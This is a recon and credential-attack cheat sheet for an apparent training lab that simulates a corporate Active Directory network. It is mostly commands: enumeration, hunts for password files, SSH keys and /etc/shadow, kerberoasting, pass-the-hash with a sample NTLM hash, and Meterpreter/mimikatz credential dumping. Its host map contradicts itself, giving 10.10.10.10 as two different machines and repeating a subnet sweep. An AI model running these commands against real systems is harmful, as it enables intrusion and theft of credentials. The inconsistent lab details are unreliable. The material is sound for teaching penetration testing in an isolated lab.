# Recon Cheat Sheet — Looking at What's On the Network

A field guide for poking around the lab's fake systems. Every command listed
here is wired up and returns realistic output. Run these in order on a fresh
session and you'll have a complete map of the environment in about 10 minutes.

The lab simulates a small corporate network:

- **10.10.10.5** — your attack box (Rembrandt Linux)
- **10.10.10.10** — DC01.CORP.LOCAL — the Active Directory domain controller
- **10.10.10.20** — Windows workstation
- **10.10.10.50** — Linux web/file server
- **10.10.10.10** — legacy Windows 7 box (the EternalBlue target)

Recon goes outward in layers: yourself, your box, your network, each host you
find, and finally the services on those hosts.

---

## Layer 0 — Who am I and what do I have?

Before you scan anything, know yourself. This is the first thing every
operator does on a new shell — the muscle memory is universal.

```
whoami
id
hostname
pwd
uname -a
cat /etc/os-release
lsb_release -a
hostnamectl
```

`whoami` returns just the username. `id` adds groups (look for `sudo`,
`adm`, `wireshark` — those tell you what you can do). `hostname` and
`hostnamectl` confirm what box you're on.

`uname -a` and `/etc/os-release` together tell you the kernel and
distro version. On a real engagement this is the first input to a
privilege escalation tool — old kernels often have local root exploits.

Quick environment checks:

```
env
echo $PATH
echo $HOME
date
uptime
w
who
last
```

`w` and `who` show currently logged-in users. `last` shows historical
logins — useful for spotting times when admins typically work (so you
know when *not* to be loud).

Look at your shell history — sometimes admins leave commands in there
that hint at what they do daily, including credentials they typed at a
prompt:

```
history
cat ~/.bash_history
cat ~/.zsh_history
```

Check what tools are installed. The presence of certain tools tells you
what kind of box this is:

```
which nmap
which python3
ls /usr/bin
dpkg -l
apt list --installed
```

`crackmapexec`, `john`, `hashcat`, `kerbrute`, `impacket-*` on a box
means it's an attacker workstation. `nginx`, `apache2`, `mysql-server`
means it's a server.

---

## Layer 1 — My box: hardware, processes, persistence

Every operator does a quick walk through processes and persistence on a
new box. This is for two reasons: orient yourself, and look for stuff
that shouldn't be there.

```
ps aux
ps -ef
top         (q to quit)
htop        (q to quit)
```

`ps aux` is the canonical "what's running" command. Look at the USER
column — anything running as root is interesting. Anything you don't
recognize is *more* interesting.

Hardware inventory:

```
lscpu
free -h
df -h
lsblk
lspci
lsusb
dmidecode
cat /proc/cpuinfo
cat /proc/meminfo
cat /proc/version
```

If `dmidecode` says "VMware" or "VirtualBox", you're in a VM — usually a
sign of a lab, sandbox, or honey-pot.

Network interfaces:

```
ip a
ip addr
ifconfig
ip route
route -n
arp -a
```

This tells you what subnets you can talk to. The `arp -a` output is a
free hint about other live boxes — anything that's spoken to you
recently shows up here.

Listening services on this box:

```
ss -tulpn
netstat -tulpn
ss -tlnp
```

If you see things listening on `0.0.0.0` (all interfaces), they're
exposed to the network. `127.0.0.1`-only is local-only.

Loaded kernel modules and firewall:

```
lsmod
sysctl -a
iptables -L -n
nft list ruleset
```

System logs (useful for both attack and defense):

```
journalctl -n 50
dmesg
```

`dmesg` shows kernel messages — sometimes you can spot the moments
attackers loaded modules or triggered USB events.

Scheduled tasks (a classic persistence vector):

```
crontab -l
ls /etc/cron.d
cat /etc/crontab
```

Sudoer rules (what you can run as root without a password):

```
sudo -l
cat /etc/sudoers
ls /etc/sudoers.d
```

Open files (what processes have what open — useful for catching
things that have a network socket):

```
lsof
lsof -i
lsof -p <pid>
```

---

## Layer 2 — The network: who else is alive?

Now look outward. Start with a ping sweep — fast, gives you a list of
live hosts.

```
sudo nmap -sn 10.10.10.0/24
```

Output names the live hosts including DC01. That's your map.

If you suspect a different subnet (say, after pivoting), sweep that
too:

```
sudo nmap -sn 10.10.10.0/24
```

The 20.x subnet has the legacy Windows 7 EternalBlue target.

Quick port sweep on a single host you find interesting (replace `<ip>`):

```
nmap -p- <ip>
nmap -F <ip>
nmap --top-ports 100 <ip>
```

Trace the path to a host (find pivots and routing oddities):

```
traceroute 10.10.10.10
mtr 10.10.10.10
```

DNS — which DNS server does the box use, and what does it know:

```
cat /etc/resolv.conf
dig DC01.CORP.LOCAL
nslookup corp.local
dig @10.10.10.10 corp.local ANY
```

The `dig @<dc>` query against a domain controller is a classic AD recon
trick — it'll cough up SRV records pointing at every domain service.

Capture traffic if you want to see what's flying past:

```
sudo tcpdump -i eth0 -nn
sudo tcpdump -i eth0 port 445
```

---

## Layer 3 — Per-host recon: services, banners, vulnerabilities

You found live hosts. Now interrogate each one. The pattern is:
ping sweep → port scan → service scan → version scan → vuln scan.

### The DC: 10.10.10.10

This is the highest-value box on the network — it holds every domain
account.

```
nmap -sV -sC 10.10.10.10
```

Look for: 88 (Kerberos), 389 (LDAP), 445 (SMB), 3268 (Global Catalog),
636 (LDAPS). All five together is the universal "this is a domain
controller" signature.

Once you've confirmed it's a DC, hit the AD-specific recon tools:

```
enum4linux -a 10.10.10.10
rpcclient -U "" -N 10.10.10.10
smbclient -L //10.10.10.10 -N
```

`enum4linux -a` fires every legal-without-creds query at SMB and prints
domain info, users, groups, and shares. On real engagements you usually
get a username list this way alone.

`rpcclient -U "" -N` opens a null SMB session. Inside, try:

```
enumdomusers
enumdomgroups
querydominfo
```

Even if these fail (modern Windows blocks anonymous), the *attempt*
shows you what hardening is in place.

`smbclient -L` lists shares — anything that says ANONYMOUS / GUEST is a
free open door.

User enumeration via Kerberos pre-auth:

```
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt
```

Kerbrute asks the DC for each username and gets a different error code
for "user doesn't exist" vs "user exists but wrong password." This is
how you build a real user list before attempting any password attacks.

### The web/file server: 10.10.10.50

```
nmap -sV -sC 10.10.10.50
```

If you see ports 80 / 443 / 8080, hit them with content discovery:

```
gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirb/common.txt
dirb http://10.10.10.50
```

This brute-forces directory and file names against the web server. Look
for `/admin`, `/backup`, `/uploads`, `.git`, hidden config files.

If 21 (FTP) or 445 (SMB) is open:

```
smbclient -L //10.10.10.50 -N
ftp 10.10.10.50
```

### The legacy Windows 7 box: 10.10.10.10

This is the EternalBlue target.

```
sudo nmap -sC -sV 10.10.10.10
```

`-sC` runs the default NSE script set, which includes `smb-vuln-*`. If
the output says `State: VULNERABLE`, you have what you came for. Move to
the EternalBlue exploit chain (see `WALKTHROUGH.md`).

---

## Layer 4 — Filesystem recon (for after you've gotten a shell)

When you land on a new box, you have minutes before someone might
notice. Spend them well.

The classic loot hunt:

```
ls -la ~/
ls -la /home
ls -la /tmp
ls -la /root              (if you're root)
ls -la /var/log
ls -la /opt
```

Find SUID binaries (potential privilege escalation):

```
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

Find world-writable files (anywhere you might leave a backdoor):

```
find / -perm -o=w -type f 2>/dev/null
find /etc -writable 2>/dev/null
```

Search for credentials in common formats:

```
grep -r "password" /etc 2>/dev/null
grep -r "PASSWORD" /home 2>/dev/null
grep -ri "api_key\|secret\|token" /var/www 2>/dev/null
find / -name "*.kdbx" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
```

Bash and shell histories from other users:

```
cat /root/.bash_history
cat /home/*/.bash_history
cat /home/*/.zsh_history
```

The classic Linux files everyone reads:

```
cat /etc/passwd                  (user list)
cat /etc/shadow                  (password hashes — root only)
cat /etc/hosts                   (the box's view of DNS)
cat /etc/os-release              (distro info)
cat /etc/sudoers
cat /etc/crontab
cat /etc/fstab                   (mounted filesystems)
cat /etc/ssh/sshd_config         (SSH server config — root login allowed?)
cat /etc/resolv.conf
```

`/etc/shadow` is the prize. If you can read it, you can crack the
hashes offline. On this lab, `sudo su` then `cat /etc/shadow`.

User-specific stuff to hunt for:

```
cat ~/.ssh/known_hosts          (boxes this user has logged into)
cat ~/.ssh/id_rsa               (private SSH key)
cat ~/.ssh/authorized_keys      (who can log in as this user)
ls ~/.config
ls ~/.aws                       (cloud creds!)
ls ~/.docker
```

---

## Layer 5 — The lab's bonus content

Things specific to this simulation that are fun to find:

```
cat /home/rembrandt/notes.txt              # plaintext credential note
cat /root/Documents/loot.txt               # admin/krbtgt hashes
cat /root/Downloads/linpeas.sh             # priv-esc script header
cat /etc/motd
cat /etc/issue
cat /proc/loadavg
```

Try the easter eggs:

```
neofetch
fortune
cowsay hello
sl
doom
```

Yes, `doom` actually works. Try it.

---

## Layer 6 — The AD attack pre-game

Once you have any single domain credential (even a low-priv one), AD
recon goes deeper. You don't need to be admin for any of this.

Get a list of users with SPNs (kerberoastable accounts):

```
impacket-GetUserSPNs corp.local/john.doe:Password1! -dc-ip 10.10.10.10
```

Request TGS tickets (the hashes you crack offline):

```
impacket-GetUserSPNs corp.local/john.doe:Password1! -dc-ip 10.10.10.10 -request
```

The output is hashes in `$krb5tgs$...` format. Save them and crack with
hashcat:

```
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

Or john:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
john --show hashes.kerberoast
```

Test creds across the network with crackmapexec:

```
crackmapexec smb 10.10.10.0/24 -u john.doe -p 'Password1!'
crackmapexec smb 10.10.10.10 -u svc_backup -p 'Backup2023!'
crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889
```

The `-H` form is the killer — pass-the-hash. You don't need the
plaintext password, just the NTLM hash.

---

## Layer 7 — Post-exploit Windows recon

If you've landed in a Windows shell (post-EternalBlue, via `shell` from
Meterpreter), the recon vocabulary changes. Same shape, different
syntax:

```
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ver
ipconfig /all
arp -a
route print
netstat -ano
wmic qfe list                   # installed patches (huge for finding missing ones)
wmic os get caption,version,buildnumber
```

Process and service recon:

```
tasklist
tasklist /svc                   # processes mapped to services
sc query                        # all services
```

Domain awareness:

```
net user
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net localgroup administrators
net view
net view /domain
nltest /domain_trusts
set                             # environment, exposes USERDOMAIN, LOGONSERVER
```

Filesystem walk (Windows version):

```
dir C:\
dir C:\Users
dir C:\Users\Administrator\Desktop
dir C:\Windows\NTDS              # holds the AD database — ntds.dit
type C:\flag.txt
```

Persistence and stored creds:

```
schtasks /query
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
cmdkey /list                     # saved credentials
findstr /si "password" *.txt *.xml *.ini
```

If you're SYSTEM, escalate from "shell" to "credentials":

```
hashdump                         # (in Meterpreter, not in Windows shell)
load kiwi                        # mimikatz extension
creds_all                        # plaintext passwords from LSASS
lsa_dump_sam
lsa_dump_secrets
```

See `LSASS_DUMP.md` for the full LSASS playbook.

---

## The shape of a good recon session

Every operator I know runs roughly the same sequence on a new box:

1. **Identity** — `whoami` / `id` / `hostname`
2. **Network** — `ip a` / `ip route`
3. **Sweep** — `nmap -sn` on the local subnet
4. **Hosts** — `nmap -sV -sC` on each interesting host
5. **AD-specific tools** — `enum4linux` / `rpcclient` / `kerbrute` if you find a DC
6. **Loot** — once you're on a box: shell history, config files, /etc/shadow
7. **Pivot** — credentials become the new attack surface

The whole loop takes 15 minutes if you're moving fast and there's
nothing surprising. Surprises slow you down — and you should follow
every surprise. A weird process name, a port you didn't expect, a
hostname that doesn't match the IP — those are the threads that pull
the whole engagement open.

When you don't know what to do next, run more recon. There's no such
thing as too much information.

---

## Cheat sheet (commands only)

```
# Self
whoami; id; hostname; pwd; uname -a; cat /etc/os-release
env; date; uptime; w; who; last
history; ls /usr/bin

# This box
ps aux; top; htop
lscpu; free -h; df -h; lsblk; lspci; lsusb
ip a; ip route; arp -a
ss -tulpn
crontab -l; cat /etc/crontab
sudo -l; cat /etc/sudoers
journalctl -n 50; dmesg

# Network
sudo nmap -sn 10.10.10.0/24
sudo nmap -sn 10.10.10.0/24
sudo nmap -sC -sV 10.10.10.10
sudo nmap -sC -sV 10.10.10.10
traceroute 10.10.10.10
dig @10.10.10.10 corp.local ANY

# AD recon (no creds needed)
enum4linux -a 10.10.10.10
rpcclient -U "" -N 10.10.10.10
smbclient -L //10.10.10.10 -N
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt

# Web
gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirb/common.txt

# Filesystem loot
find / -perm -4000 -type f 2>/dev/null
grep -r "password" /etc 2>/dev/null
cat /etc/passwd; cat /etc/shadow; cat /etc/sudoers

# AD attacks (with one cred)
impacket-GetUserSPNs corp.local/john.doe:Password1! -dc-ip 10.10.10.10 -request
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
crackmapexec smb 10.10.10.0/24 -u john.doe -p 'Password1!'

# Windows post-exploit (in cmd.exe shell)
whoami /priv; whoami /groups; systeminfo; net user /domain
tasklist /svc; netstat -ano; cmdkey /list
findstr /si "password" *.txt *.xml *.ini

# Meterpreter (after EternalBlue)
getuid; sysinfo; hashdump
load kiwi; creds_all; lsa_dump_sam; lsa_dump_secrets
```
